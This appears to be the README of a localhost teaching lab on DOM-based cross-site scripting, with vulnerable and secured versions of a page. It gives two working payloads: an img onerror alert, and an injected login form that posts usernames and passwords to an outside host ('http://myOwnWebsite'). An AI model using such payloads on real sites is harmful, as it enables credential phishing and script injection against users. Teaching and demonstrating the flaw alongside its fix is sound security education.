# DOM-Based-XSS-Lab
DOM-based cross-site scripting (DOM-XSS) is a client side vulnerability where 
attacker-controlled data is interpreted by the browser in a way that modifies the 
page’s DOM (Document Object Model) and allows script execution. Unlike reflected 
or stored XSS, the dangerous transformation happens entirely in the browser. The 
server typically returns the same HTML to everyone, and the client-side JavaScript 
takes untrusted input (from the URL, fragment etc.) and writes it into the page using a 
“sink” that interprets it as code or HTML.

### Overview 
The two folders have the vulernable code and the secured version of the code. Running these folders on a python HTTP server we can demonstrate the effects of a DOM-Based XSS attack 


### Running the Code 
To the run the code you must install python3 and have a suitable browser e.g. Firefox or Chrome installed 

### Python Command 
Inside a terminal within ONE of the folders execute the following command 

python3 -m http.server 8000 

If this fails change the port number (8000) to another number 

### Visiting Website 
Enter the URL http://localhost:{PORTNUMBER}/

### Performing the exploit 
To perform the exploit on the vulnerable source code enter the following element into the search bar 

<img src=x onerror=alert('Hacked')>

A popup should appear with the text 'Hacked' 

Performing a more malicous attack enter the following form element into the search bar 

<form action="http://myOwnWebsite" method="POST">
  <input type="text" name="username" placeholder="Username">
  <input type="password" name="password" placeholder="Password">
  <input type="submit" value="Login">
</form>

Now you should see a mock login form appear on the screen 

### Mitigation (Secured Code) 

Apply the steps above for the secured code and enter the elements into the search bar and it should result into just plain text on the web page.
